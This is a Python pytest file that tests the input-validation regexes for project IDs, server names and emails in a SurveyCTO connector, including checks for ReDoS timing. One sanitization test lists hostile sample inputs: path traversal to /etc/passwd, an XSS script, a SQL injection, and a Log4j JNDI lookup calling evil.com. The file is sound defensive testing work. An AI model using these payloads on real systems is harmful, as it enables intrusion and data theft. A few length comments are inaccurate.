"""Test regex patterns and security in SurveyCTO connector."""

import contextlib
import re
import time

import pytest
from pydantic_core import ValidationError

from datasure.connectors.scto import ServerCredentials
from datasure.utils.settings_utils import ProjectID


@pytest.fixture(autouse=True)
def mock_database_functions(monkeypatch):
    """Override the autouse fixture from conftest.

    Disables database mocking for these tests.
    """
    pass


class TestProjectIDRegex:
    """Test ProjectID regex pattern security."""

    def test_project_id_regex_valid_inputs(self):
        """Test that valid project IDs pass validation."""
        valid_project_ids = [
            "abc12345",
            "test1234",
            "project1",
            "12345678",
            "abcdefgh",
            "a1b2c3d4",
            "00000000",
            "zzzzz999",
        ]

        for project_id in valid_project_ids:
            # Should not raise exception
            obj = ProjectID(project_id=project_id)
            assert obj.project_id == project_id

    def test_project_id_regex_invalid_inputs(self):
        """Test that invalid project IDs fail validation."""
        invalid_project_ids = [
            "ABC12345",  # uppercase letters
            "test-123",  # hyphen
            "test_123",  # underscore
            "test.123",  # dot
            "test 123",  # space
            "test@123",  # special character
            "test#123",  # hash
            "test$123",  # dollar sign
            "test%123",  # percent
            "test&123",  # ampersand
            "test*123",  # asterisk
            "test+123",  # plus
            "test=123",  # equals
            "test[123",  # bracket
            "test]123",  # bracket
            "test{123",  # brace
            "test}123",  # brace
            "test|123",  # pipe
            "test\\123",  # backslash
            "test/123",  # forward slash
            "test?123",  # question mark
            "test<123",  # less than
            "test>123",  # greater than
            "test,123",  # comma
            "test;123",  # semicolon
            "test:123",  # colon
            'test"123',  # quote
            "test'123",  # apostrophe
            "test`123",  # backtick
            "test~123",  # tilde
            "test!123",  # exclamation
        ]

        for project_id in invalid_project_ids:
            with pytest.raises(
                ValueError,
                match="Project ID must be alphanumeric only and exactly 8 characters long",
            ):
                ProjectID(project_id=project_id)

    def test_project_id_regex_length_validation(self):
        """Test project ID length validation."""
        # Too short
        short_ids = ["", "a", "ab", "abc", "abcd", "abcde", "abcdef", "abcdefg"]
        for project_id in short_ids:
            with pytest.raises(ValueError):
                ProjectID(project_id=project_id)

        # Too long
        long_ids = ["abcdefghi", "abcdefghij", "a" * 20, "1" * 50]
        for project_id in long_ids:
            with pytest.raises(ValueError):
                ProjectID(project_id=project_id)

    def test_project_id_regex_performance(self):
        """Test that project ID regex performs well and doesn't exhibit backtracking."""
        test_cases = [
            "abc12345",  # valid
            "ABCDEFGH",  # invalid (uppercase)
            "a" * 8,  # valid (all letters)
            "1" * 8,  # valid (all numbers)
            "a" * 7 + "B",  # invalid (uppercase at end)
            "a" * 100,  # invalid (too long)
        ]

        for test_case in test_cases:
            start_time = time.time()
            try:  # noqa: SIM105
                ProjectID(project_id=test_case)
            except ValueError:
                pass  # Expected for invalid cases
            end_time = time.time()

            # Should complete very quickly (less than 0.01 seconds)
            execution_time = end_time - start_time
            assert execution_time < 0.01, (
                f"Regex took {execution_time:.6f}s for input: {test_case}"
            )


class TestServerNameRegex:
    """Test server name regex pattern security."""

    def test_server_name_regex_valid_inputs(self):
        """Test that valid server names pass validation."""
        valid_server_names = [
            "server1",
            "myserver",
            "test123",
            "a1",  # minimum length
            "s" + "0" * 63,  # maximum length
            "server",
            "abc",
            "test",
            "production1",
            "staging2",
        ]

        for server_name in valid_server_names:
            # Should not raise exception
            creds = ServerCredentials(
                server=server_name, user="test@example.com", password="password"
            )
            assert creds.server == server_name

    def test_server_name_regex_invalid_inputs(self):
        """Test that invalid server names fail validation."""
        invalid_server_names = [
            "",  # empty
            "1server",  # starts with number
            "Server1",  # uppercase letter
            "MYSERVER",  # all uppercase
            "server-1",  # hyphen
            "server_1",  # underscore
            "server.1",  # dot
            "server 1",  # space
            "server@1",  # at symbol
            "server#1",  # hash
            "server$1",  # dollar
            "server%1",  # percent
            "server&1",  # ampersand
            "server*1",  # asterisk
            "server+1",  # plus
            "server=1",  # equals
            "server[1",  # bracket
            "server]1",  # bracket
            "server{1",  # brace
            "server}1",  # brace
            "server|1",  # pipe
            "server\\1",  # backslash
            "server/1",  # forward slash
            "server?1",  # question mark
            "server<1",  # less than
            "server>1",  # greater than
            "server,1",  # comma
            "server;1",  # semicolon
            "server:1",  # colon
            'server"1',  # quote
            "server'1",  # apostrophe
            "server`1",  # backtick
            "server~1",  # tilde
            "server!1",  # exclamation
            "A",  # single uppercase
            "1",  # single number
            "a" * 65,  # too long (exceeds 64 chars total)
        ]

        for server_name in invalid_server_names:
            with pytest.raises(ValidationError):
                ServerCredentials(
                    server=server_name, user="test@example.com", password="password"
                )

    def test_server_name_regex_length_limits(self):
        """Test server name length limits."""
        # Test minimum length (should be at least 2 characters total)
        valid_min = "ab"  # 2 characters
        creds = ServerCredentials(
            server=valid_min, user="test@example.com", password="password"
        )
        assert creds.server == valid_min

        # Test maximum length (64 characters total)
        valid_max = "a" + "b" * 63  # 64 characters
        creds = ServerCredentials(
            server=valid_max, user="test@example.com", password="password"
        )
        assert creds.server == valid_max

        # Test too long (65+ characters)
        too_long = "a" + "b" * 64  # 65 characters
        with pytest.raises(ValidationError):
            ServerCredentials(
                server=too_long, user="test@example.com", password="password"
            )

    def test_server_name_regex_performance(self):
        """Test that server name regex performs well without backtracking."""
        test_cases = [
            "server1",  # valid
            "myserver123",  # valid
            "a" * 20 + "1",  # valid long name
            "a" * 30 + "B",  # invalid (uppercase at end)
            "Server123",  # invalid (starts with uppercase)
            "1server",  # invalid (starts with number)
            "a" * 100,  # invalid (too long)
            "server-name",  # invalid (hyphen)
        ]

        for test_case in test_cases:
            start_time = time.time()
            try:  # noqa: SIM105
                ServerCredentials(
                    server=test_case, user="test@example.com", password="password"
                )
            except ValueError:
                pass  # Expected for invalid cases
            end_time = time.time()

            # Should complete very quickly (less than 0.01 seconds)
            execution_time = end_time - start_time
            assert execution_time < 0.01, (
                f"Server name regex took {execution_time:.6f}s for input: {test_case}"
            )

    def test_server_name_regex_edge_cases(self):
        """Test edge cases for server name validation."""
        # Test with numbers only (after first character)
        valid_cases = [
            "a1",
            "a12",
            "a123",
            "s0123456789",
        ]

        for case in valid_cases:
            creds = ServerCredentials(
                server=case, user="test@example.com", password="password"
            )
            assert creds.server == case

        # Test with mixed alphanumeric
        mixed_cases = [
            "server1a2b3",
            "a1b2c3d4",
            "test123abc",
        ]

        for case in mixed_cases:
            creds = ServerCredentials(
                server=case, user="test@example.com", password="password"
            )
            assert creds.server == case


class TestEmailRegex:
    """Test email regex pattern security."""

    def test_email_regex_valid_inputs(self):
        """Test that valid email addresses pass validation."""
        valid_emails = [
            "user@example.com",
            "test.user@domain.org",
            "admin+tag@site.net",
            "user123@test-domain.com",
            "a@b.co",
            "user.name@example-site.com",
            "user_name@example.org",
            "user+tag+more@example.com",
            "user%percent@example.com",
            "user-name@example.com",
            "123user@example.com",
            "user@123domain.com",
            "user@domain-name.com",
            "user@sub.domain.com",
            "user@example.museum",  # long TLD
            "a" * 64 + "@example.com",  # max local part length
        ]

        for email in valid_emails:
            # Should not raise exception
            creds = ServerCredentials(
                server="testserver", user=email, password="password"
            )
            assert creds.user == email

    def test_email_regex_invalid_inputs(self):
        """Test that invalid email addresses fail validation."""
        invalid_emails = [
            "",  # empty
            "notanemail",  # no @ symbol
            "@domain.com",  # no local part
            "user@",  # no domain
            "user@domain",  # no TLD
            "user@domain.",  # empty TLD
            "user name@domain.com",  # space in local part
            "user@domain .com",  # space in domain
            "user@@domain.com",  # double @
            "user@domain@com",  # @ in domain
            "user@domain.c",  # TLD too short
            "user@domain.toolongtld",  # TLD too long
        ]

        for email in invalid_emails:
            with pytest.raises(ValidationError):
                ServerCredentials(server="testserver", user=email, password="password")

    def test_email_regex_length_limits(self):
        """Test email length limits."""
        # Test maximum local part length (64 characters)
        max_local = "a" * 116 + "@example.com"
        creds = ServerCredentials(
            server="testserver", user=max_local, password="password"
        )
        assert creds.user == max_local

        # Test local part too long (128+ characters)
        too_long_local = "a" * 128 + "@example.com"
        with pytest.raises(ValidationError):
            ServerCredentials(
                server="testserver", user=too_long_local, password="password"
            )

        # Test maximum domain part length (124 characters before TLD)
        max_domain = "user@" + "a" * 119 + ".com"  # 128 chars including .com
        creds = ServerCredentials(
            server="testserver", user=max_domain, password="password"
        )
        assert creds.user == max_domain

        # Test domain part too long
        too_long_domain = "user@" + "a" * 120 + ".com"
        with pytest.raises(ValidationError):
            ServerCredentials(
                server="testserver", user=too_long_domain, password="password"
            )

    def test_email_regex_performance(self):
        """Test that email regex performs well without backtracking."""
        test_cases = [
            "user@example.com",  # valid
            "test.user@domain.org",  # valid
            "a" * 50 + "@example.com",  # valid long local part
            "user@" + "a" * 50 + ".com",  # valid long domain
            "a" * 100 + "@" + "b" * 100 + ".INVALID",  # invalid (too long)
            "user@domain@invalid.com",  # invalid (double @)
            "user..name@domain.com",  # invalid (double dot)
            "invalid.email",  # invalid (no @)
        ]

        for test_case in test_cases:
            start_time = time.time()
            try:  # noqa: SIM105
                ServerCredentials(
                    server="testserver", user=test_case, password="password"
                )
            except ValueError:
                pass  # Expected for invalid cases
            end_time = time.time()

            # Should complete very quickly (less than 0.01 seconds)
            execution_time = end_time - start_time
            assert execution_time < 0.01, (
                f"Email regex took {execution_time:.6f}s for input: {test_case}"
            )

    def test_email_regex_tld_validation(self):
        """Test TLD (top-level domain) validation."""
        # Valid TLD lengths (2-7 characters)
        valid_tlds = [
            "user@example.co",  # 2 chars
            "user@example.com",  # 3 chars
            "user@example.info",  # 4 chars
            "user@example.travel",  # 6 chars
            "user@example.museum",  # 7 chars
        ]

        for email in valid_tlds:
            creds = ServerCredentials(
                server="testserver", user=email, password="password"
            )
            assert creds.user == email

        # Invalid TLD lengths
        invalid_tlds = [
            "user@example.c",  # 1 char (too short)
            "user@example.toolongtld",  # 9 chars (too long)
        ]

        for email in invalid_tlds:
            with pytest.raises(
                ValueError, match="Invalid email format for SurveyCTO user"
            ):
                ServerCredentials(server="testserver", user=email, password="password")


class TestRegexSecurityBestPractices:
    """Test that regex patterns follow security best practices."""

    def test_bounded_quantifiers(self):
        """Test that all quantifiers are bounded to prevent ReDoS attacks."""
        # This test ensures that we don't have unbounded quantifiers like *, +, {n,}
        # that could lead to catastrophic backtracking

        # Test project ID regex bounds
        project_id_pattern = r"^[a-z0-9]{8}$"
        assert re.search(r"\{8\}", project_id_pattern), (
            "Project ID should have exact length quantifier"
        )

        # Test server name regex bounds
        server_pattern = r"^[a-z][a-z0-9]{1,63}$"
        assert re.search(r"\{1,63\}", server_pattern), (
            "Server name should have bounded quantifier"
        )

    def test_anchor_usage(self):
        """Test that regex patterns use proper anchors to prevent partial matching."""
        test_cases = [
            # These should all fail validation even though they contain valid substrings
            ("malicious_abc12345_suffix", "project_id"),
            ("prefix_testserver", "server_name"),
        ]

        for test_input, field_type in test_cases:
            if field_type == "project_id":
                with pytest.raises(ValidationError):
                    ProjectID(project_id=test_input)
            elif field_type == "server_name":
                with pytest.raises(ValueError):
                    ServerCredentials(
                        server=test_input, user="test@example.com", password="password"
                    )

    def test_character_class_precision(self):
        """Test that character classes are precise and don't allow unintended
        characters.
        """
        # Test that project ID only allows a-z0-9
        invalid_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;':\",./<>?"

        for char in invalid_chars:
            test_id = "abc123" + char + "d"
            with pytest.raises(ValueError):
                ProjectID(project_id=test_id)

        # Test that server name only allows a-z0-9 after first character
        for char in "ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_+-=[]{}|;':\",./<>?":
            test_server = "a" + char + "test"
            with pytest.raises(ValueError):
                ServerCredentials(
                    server=test_server, user="test@example.com", password="password"
                )

    def test_no_catastrophic_backtracking(self):
        """Test that patterns don't exhibit catastrophic backtracking behavior."""
        # Test with potentially problematic inputs that could cause exponential
        # backtracking
        problematic_inputs = [
            "a" * 50 + "B",  # Many repetitions ending with invalid character
            "a" * 100 + "@",  # Very long string with delimiter
            "a" * 1000,  # Very long string
        ]

        for test_input in problematic_inputs:
            start_time = time.time()

            # Test project ID validation
            with contextlib.suppress(ValueError):
                ProjectID(project_id=test_input)

            # Test server name validation
            with contextlib.suppress(ValueError):
                ServerCredentials(
                    server=test_input, user="test@example.com", password="password"
                )

            # Test email validation
            with contextlib.suppress(ValueError):
                ServerCredentials(
                    server="testserver", user=test_input, password="password"
                )

            end_time = time.time()
            execution_time = end_time - start_time

            # All validations should complete very quickly even with problematic input
            assert execution_time < 0.1, (
                f"Validation took {execution_time:.6f}s for input length: {len(test_input)}"
            )

    def test_input_sanitization(self):
        """Test that validation properly sanitizes and rejects malicious input."""
        malicious_inputs = [
            "../../../etc/passwd",  # Path traversal
            "<script>alert('xss')</script>",  # XSS attempt
            "'; DROP TABLE users; --",  # SQL injection attempt
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "\x00\x01\x02\x03",  # Control characters
            "\n\r\t",  # Whitespace/newlines
            "user\0@example.com",  # Null byte injection
        ]

        for malicious_input in malicious_inputs:
            # None of these should be accepted as valid
            with pytest.raises(ValueError):
                ProjectID(project_id=malicious_input)

            with pytest.raises(ValueError):
                ServerCredentials(
                    server=malicious_input, user="test@example.com", password="password"
                )

            with pytest.raises(ValueError):
                ServerCredentials(
                    server="testserver", user=malicious_input, password="password"
                )


class TestRegressionPrevention:
    """Test cases to prevent regression of common regex vulnerabilities."""

    def test_proper_escaping(self):
        """Test that special regex characters are properly escaped when literal."""
        # Test that dots, brackets, etc. are treated literally when needed
        special_chars = r"\.[]{}()*+?^$|/"

        for char in special_chars:
            test_project_id = "abc12345" + char + "d"
            test_server = "test" + char + "server"
            test_email = "user" + char + "@example.com"

            # These should all fail validation (special chars not allowed)
            with pytest.raises(ValidationError):
                ProjectID(project_id=test_project_id)

            with pytest.raises(ValidationError):
                ServerCredentials(
                    server=test_server, user="test@example.com", password="password"
                )

            if char in "\\[]{}()*?^$|/":
                with pytest.raises(ValidationError):
                    ServerCredentials(
                        server="testserver", user=test_email, password="password"
                    )

    def test_unicode_handling(self):
        """Test proper handling of Unicode characters."""
        unicode_inputs = [
            "test™123",  # trademark symbol
            "tëst123",  # accented characters
            "test中文123",  # Chinese characters
            "test🚀123",  # emoji
            "test\u0000123",  # null character
            "test\u200b123",  # zero-width space
        ]

        for unicode_input in unicode_inputs:
            # All should be rejected (only ASCII alphanumeric allowed)
            with pytest.raises(ValueError):
                ProjectID(project_id=unicode_input)

            with pytest.raises(ValueError):
                ServerCredentials(
                    server=unicode_input, user="test@example.com", password="password"
                )


class TestComprehensiveCoverage:
    """Comprehensive test coverage for edge cases and boundary conditions."""

    def test_boundary_conditions(self):
        """Test exact boundary conditions for length limits."""
        # Project ID boundaries (exactly 8 characters)
        ProjectID(project_id="a" * 8)  # Should work
        with pytest.raises(ValueError):
            ProjectID(project_id="a" * 7)  # Too short
        with pytest.raises(ValueError):
            ProjectID(project_id="a" * 9)  # Too long

        # Server name boundaries (2-64 characters, starting with letter)
        ServerCredentials(
            server="ab", user="test@example.com", password="password"
        )  # Min length
        ServerCredentials(
            server="a" + "b" * 63, user="test@example.com", password="password"
        )  # Max length

        with pytest.raises(ValueError):
            ServerCredentials(
                server="a", user="test@example.com", password="password"
            )  # Too short
        with pytest.raises(ValueError):
            ServerCredentials(
                server="a" + "b" * 64, user="test@example.com", password="password"
            )  # Too long

    def test_all_allowed_characters(self):
        """Test that all explicitly allowed characters work correctly."""
        # Test all lowercase letters and digits for project ID
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            test_id = char + "bc12345"
            ProjectID(project_id=test_id)

        # Test all allowed server name characters
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            if char.isdigit():  # noqa: SIM108
                # Numbers can't be first character
                test_server = "a" + char + "test"
            else:
                # Letters can be first character
                test_server = char + "1test"
            ServerCredentials(
                server=test_server, user="test@example.com", password="password"
            )

    def test_error_message_consistency(self):
        """Test that error messages are consistent and informative."""
        # Test project ID error messages
        with pytest.raises(
            ValueError,
            match="Project ID must be alphanumeric only and exactly 8 characters long",
        ):
            ProjectID(project_id="invalid!")

        # Test server name error messages
        with pytest.raises(ValueError, match="Invalid SurveyCTO server name format"):
            ServerCredentials(
                server="Invalid!", user="test@example.com", password="password"
            )

        # Test email error messages
        with pytest.raises(ValueError, match="Invalid email format for SurveyCTO user"):
            ServerCredentials(
                server="testserver", user="invalid-email", password="password"
            )

    def test_case_sensitivity(self):
        """Test case sensitivity handling."""
        # Project IDs should be case sensitive (only lowercase allowed)
        ProjectID(project_id="abc12345")  # lowercase - should work
        with pytest.raises(ValueError):
            ProjectID(project_id="ABC12345")  # uppercase - should fail

        # Server names should be case sensitive (only lowercase allowed)
        ServerCredentials(
            server="testserver", user="test@example.com", password="password"
        )  # lowercase
        with pytest.raises(ValueError):
            ServerCredentials(
                server="TestServer", user="test@example.com", password="password"
            )  # mixed case

        # Email validation should handle case properly (generally case-insensitive
        # for domain)
        ServerCredentials(
            server="testserver", user="Test@Example.COM", password="password"
        )  # Should work
